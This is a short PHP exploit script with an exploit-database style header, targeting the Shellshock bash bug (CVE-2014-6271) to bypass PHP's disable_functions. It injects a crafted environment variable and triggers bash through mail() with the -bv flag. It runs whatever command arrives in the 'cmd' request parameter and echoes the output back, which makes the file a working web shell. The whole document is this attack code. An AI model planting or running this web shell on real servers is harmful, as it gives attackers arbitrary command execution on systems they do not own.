<?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
    $tmp = tempnam(".","data"); 
    putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
    // In Safe Mode, the user may only alter environment variableswhose names 
    // begin with the prefixes supplied by this directive. 
    // By default, users will only be able to set environment variablesthat 
    // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
    // PHP will let the user modify ANY environment variable! 
    mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
    $output = @file_get_contents($tmp); 
    @unlink($tmp); 
    if($output != "") return $output; 
    else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>
